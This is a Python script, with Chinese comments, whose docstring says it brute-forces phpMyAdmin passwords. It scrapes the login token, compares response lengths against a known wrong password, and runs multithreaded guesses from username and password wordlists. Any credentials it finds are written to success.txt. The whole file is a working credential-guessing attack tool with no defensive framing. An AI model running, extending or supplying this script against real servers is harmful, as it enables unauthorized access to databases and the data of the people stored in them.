#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@Author: CoolCat
@Modified By: TARI 增加用户名字典，升级为Python3、多线程、支持 pma 5.0.2
脚本功能：暴力破解phpMyadmin密码
"""

import re
import time
import requests

from threads import WorkManager


def pma_login(url, uname, pwd, token):
    """
    登录 phpmyadmin 的过程
    :param url: pma 地址
    :param uname: 用户名
    :param pwd: 密码
    :param token: 登录token
    :return: 登录接口session
    """
    try:
        session = requests.session()
        fucker = {'pma_username': uname,
                  'pma_password': pwd,
                  "server": "1",
                  "target": "url.php",
                  'token': token}
        session.post(url, data=fucker)
        url2 = url + '/index.php?target=url.php&token=' + token
        r = session.get(url=url2, timeout=2)

        return r
    except Exception as e:
        print(e)
        print("[!] 在验证账号:" + str(uname) + "密码:" + str(pwd) + " 时发生未知错误")
        return


def init(url, uname):
    """
    请求给定的url，获取phpmyadmin的token和输入错误密码的返回 http 头长度
    :param uname: 用户名，因为用户名长度不一样错误时返回的 http 头长度不一样
    :param url: phpmyadmin 的 url 如 localhost:8080 即可
    :return: 登录所需的 token 和 输入错误密码的返回的 http 头长度 contentLengthRaw
    """
    try:
        res = requests.get(url, timeout=2)
    except requests.exceptions.MissingSchema:
        exit('请输入正确的URL')

    try:
        assert res.status_code == 200
    except AssertionError:
        exit(res.text)

    token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)[0]
    print("[!]Token:" + token)

    r = pma_login(url, uname, 'error_password_t3ri', token)

    contentLengthRaw = len(r.text)

    print("[-]初始返回头长度设定为:" + str(contentLengthRaw) + "\n")

    return token, contentLengthRaw


def crack_pma(url, uname, pwd, token, contentLengthRaw, timeDelay):
    """

    :param uname: 用户名
    :param pwd: 密码
    :param token: 登录token
    :param contentLengthRaw: 错误密码的返回的 http 头长度
    :param timeDelay: 爆破延时时间
    :return:
    """
    r = pma_login(url, uname, pwd, token)
    try:
        contentLength = len(r.text)
    except AttributeError as e:
        print(e)
        print("[!] 在验证账号:" + str(uname) + "密码:" + str(pwd) + " 时发生未知错误")
        return

    print("[?]正在验证账号:" + str(uname) + " 密码:" + str(pwd))
    if contentLength == contentLengthRaw:
        print("[-]返回头长度为:" + str(contentLength) + " 密码错误！")
    else:
        print("[+]返回头长度为:" + str(contentLength) + " 密码正确！")
        coolcat = open("success.txt", "a")
        coolcat.write(url + "的 " + str(uname) + " 密码为:" + str(pwd) + " 返回头长度为:" + str(contentLength) + "\n")
        coolcat.close()
        exit(0)

    time.sleep(timeDelay)


if __name__ == '__main__':
    # 线程数量
    threadNum = 16
    # 延时 timeDelay s 爆破
    timeDelay = 0

    url = input("URL:")
    url = url.replace("\n", "").replace("\r", "").replace("index.php", "")

    # 初始化线程池
    wm = WorkManager(threadNum)

    for uname in open("username.txt"):
        uname = uname.replace("\r", "").replace("\n", "")
        token, contentLengthRaw = init(url, uname)
        for pwd in open("password.txt"):
            pwd = pwd.replace("\r", "").replace("\n", "")

            wm.add_job(crack_pma, url, uname, pwd, token, contentLengthRaw, timeDelay)

    wm.start()
    wm.wait_for_complete()
